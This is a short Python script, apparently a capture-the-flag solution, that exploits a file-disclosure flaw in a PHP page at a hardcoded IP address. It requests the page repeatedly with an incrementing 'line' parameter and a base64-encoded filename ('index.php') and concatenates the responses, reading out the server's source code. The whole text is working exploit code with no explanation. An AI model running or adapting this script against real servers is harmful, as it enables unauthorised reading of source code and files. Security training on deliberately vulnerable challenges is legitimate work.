#coding:utf-8
import requests,base64
import re
html=''
url='http://120.24.86.145:8002/web11/index.php?line=%d&filename=aW5kZXgucGhw'
s=requests.Session()
for i in range(100):
    content=s.get(url%i)
    if content.text=='':
        break
    html+=content.text
